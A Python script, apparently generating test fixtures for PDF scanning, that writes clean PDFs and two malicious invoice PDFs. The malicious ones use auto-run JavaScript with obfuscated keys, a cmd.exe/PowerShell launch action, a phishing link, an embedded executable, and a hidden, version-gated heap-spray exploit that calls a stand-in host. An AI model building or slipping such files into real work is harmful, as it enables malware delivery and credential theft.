import sys
def build(objs, path):
    out = b"%PDF-1.7\n"
    offs = []
    for i, o in enumerate(objs, 1):
        offs.append(len(out))
        out += f"{i} 0 obj\n".encode() + o + b"\nendobj\n"
    x = len(out)
    out += f"xref\n0 {len(objs)+1}\n0000000000 65535 f \n".encode()
    for o in offs: out += f"{o:010} 00000 n \n".encode()
    out += f"trailer\n<< /Size {len(objs)+1} /Root 1 0 R >>\nstartxref\n{x}\n%%EOF\n".encode()
    open(path, "wb").write(out)

text = b"BT /F1 24 Tf 72 700 Td (Quarterly invoice - please review) Tj ET"
page = lambda extra=b"": b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >>" + extra + b" >>"
content = b"<< /Length %d >>\nstream\n" % len(text) + text + b"\nendstream"
font = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"

# clean
build([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>", page(), content, font], sys.argv[1] + "/clean.pdf")

# evil: JS on open (obfuscated key), launch action, phishing link, embedded file
js = b"var u='http://evil-cdn.example/p.exe'; this.submitForm({cURL:u}); app.launchURL(u);"
evil = [
    b"<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /EmbeddedFiles << /Names [(invoice.exe) 9 0 R] >> >> >>",
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    page(b" /Annots [7 0 R] /AA << /O 8 0 R >>"),
    content, font,
    b"<< /Type /Action /S /J#61vaScript /J#53 10 0 R >>",
    b"<< /Type /Annot /Subtype /Link /Rect [72 690 400 720] /A << /S /URI /URI (http://login-microsoft.example/verify?id=42) >> >>",
    b"<< /Type /Action /S /Launch /F (cmd.exe) /Win << /F (cmd.exe) /P (/c powershell -enc SQBFAFgA) >> >>",
    b"<< /Type /Filespec /F (invoice.exe) /EF << /F 11 0 R >> >>",
    b"<< /Length %d >>\nstream\n" % len(js) + js + b"\nendstream",
    b"<< /Type /EmbeddedFile /Length 6 >>\nstream\nMZ\x90\x00\x03\x00\nendstream",
]
build(evil, sys.argv[1] + "/evil.pdf")

# evil2: exploit-kit style. Stage 2 hidden in /Info /Subject, version-gated.
stage2 = b"""var sc = unescape("%u9090%u9090%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b");
var nop = unescape("%u0c0c%u0c0c");
while (nop.length < 0x200000) nop += nop;
var block = nop.substring(0, 0x200000 - sc.length) + sc;
var spray = new Array();
for (var i = 0; i < 20; i++) spray[i] = block.substring(0, block.length);
util.printf("%45000f", 1.0);
this.exportDataObject({cName: "invoice.exe", nLaunch: 2});
app.launchURL("http://evil-cdn.example/gate.php?id=" + app.viewerVersion, true);"""
encoded = "".join("Z%02X" % c for c in stage2).encode()
opener = b"var s = this.info.Subject; var code = unescape(s.replace(/Z/g, '%')); if (app.viewerVersion < 9.1) { eval(code); } else { app.alert('Please update Adobe Reader'); }"
evil2 = [
    b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS 6 0 R >> >>",
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    page(), content, font,
    b"<< /Length %d >>\nstream\n" % len(opener) + opener + b"\nendstream",
]
def build_info(objs, path, info):
    out = b"%PDF-1.7\n"; offs = []
    for i, o in enumerate(objs, 1):
        offs.append(len(out)); out += f"{i} 0 obj\n".encode() + o + b"\nendobj\n"
    offs.append(len(out)); out += f"{len(objs)+1} 0 obj\n".encode() + info + b"\nendobj\n"
    x = len(out); n = len(offs) + 1
    out += f"xref\n0 {n}\n0000000000 65535 f \n".encode()
    for o in offs: out += f"{o:010} 00000 n \n".encode()
    out += f"trailer\n<< /Size {n} /Root 1 0 R /Info {len(objs)+1} 0 R >>\nstartxref\n{x}\n%%EOF\n".encode()
    open(path, "wb").write(out)
build_info(evil2, sys.argv[1] + "/evil2.pdf", b"<< /Title (Invoice) /Subject (" + encoded + b") >>")

# text: 3 pages of ordinary text, used for live mode / search tests.
def text_page(lines):
    ops = b"BT /F1 14 Tf 72 720 Td 18 TL " + b" ".join(b"(" + l + b") '" for l in lines) + b" ET"
    return b"<< /Length %d >>\nstream\n" % len(ops) + ops + b"\nendstream"
pages_txt = [
    [b"Quarterly report", b"Shipments monitored: 1204", b"Cold chain integrity confirmed."],
    [b"Temperature excursions", b"Two shipments exceeded 8 degrees.", b"Corrective actions logged."],
    [b"Appendix", b"Sensor calibration records attached.", b"End of report."],
]
objs = [b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R 4 0 R 5 0 R] /Count 3 >>"]
for i in range(3):
    objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents %d 0 R /Resources << /Font << /F1 9 0 R >> >> >>" % (6 + i))
objs.append(b"")  # placeholder keeps numbering: 6,7,8 are contents
objs = objs[:5] + [text_page(p) for p in pages_txt] + [font]
build(objs, sys.argv[1] + "/text.pdf")
